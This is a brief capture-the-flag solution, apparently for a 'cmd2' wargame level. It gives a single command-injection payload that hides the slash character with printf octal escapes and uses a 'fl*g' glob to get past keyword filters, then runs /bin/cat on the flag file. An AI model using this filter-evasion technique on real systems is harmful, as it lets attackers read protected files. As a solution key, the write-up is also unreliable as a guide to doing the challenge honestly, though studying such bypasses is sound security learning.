# Solution:
```./cmd2 '$(printf "%b" "\57")bin$(printf "%b" "\57")cat fl*g'```

# Explanation:
* $(printf "%b" "\57") is replaced with "/" (in order to bypass "/" filter)
* fl*g is replaced with flag (in order to bypass "flag" filter)

